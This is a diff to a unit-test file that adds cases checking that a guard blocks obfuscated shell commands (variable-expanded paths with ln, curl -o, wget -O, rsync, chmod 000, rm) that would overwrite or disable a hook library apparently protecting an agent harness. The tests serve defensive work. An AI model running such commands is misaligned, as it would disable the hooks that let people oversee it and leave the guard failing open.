@@ -141,6 +141,38 @@ class TestVarExpansionBypassBlocked(unittest.TestCase):
         self._assert_blocked(
             "D=h; D=${D}ooks; python3 -c \"open('$D/lib/emit.sh','w').write('x')\"")
 
+    # ---- grill-code A-Crit-1: extended WRITE_OP coverage ----
+    # These utilities were missing from the v1.6.1 initial WRITE_OP regex.
+    # Each can overwrite hooks/lib/emit.sh and collapse the moat just like
+    # `> $D/lib/emit.sh`. They must trigger ASK via cmd_var_built_write.
+
+    def test_ln_sf_via_var(self):
+        self._assert_blocked(
+            "D=h; D=${D}ooks; ln -sf /tmp/evil $D/lib/emit.sh")
+
+    def test_curl_o_via_var(self):
+        self._assert_blocked(
+            "D=h; D=${D}ooks; curl -o $D/lib/emit.sh http://e")
+
+    def test_wget_O_via_var(self):
+        self._assert_blocked(
+            "D=h; D=${D}ooks; wget -O $D/lib/emit.sh http://e")
+
+    def test_rsync_via_var(self):
+        self._assert_blocked(
+            "D=h; D=${D}ooks; rsync /tmp/x $D/lib/emit.sh")
+
+    def test_chmod_via_var(self):
+        """chmod 000 disables a hook via permission rather than content,
+        but the moat-collapse end-state is identical (the lib fails to
+        source → fail-open). Must ASK."""
+        self._assert_blocked(
+            "D=h; D=${D}ooks; chmod 000 $D/lib/emit.sh")
+
+    def test_rm_via_var(self):
+        self._assert_blocked(
+            "D=h; D=${D}ooks; rm $D/lib/emit.sh")
+
 
 class TestNormalCommandsStillAllowed(unittest.TestCase):
     """The heuristic must NOT regress normal workflow commands."""
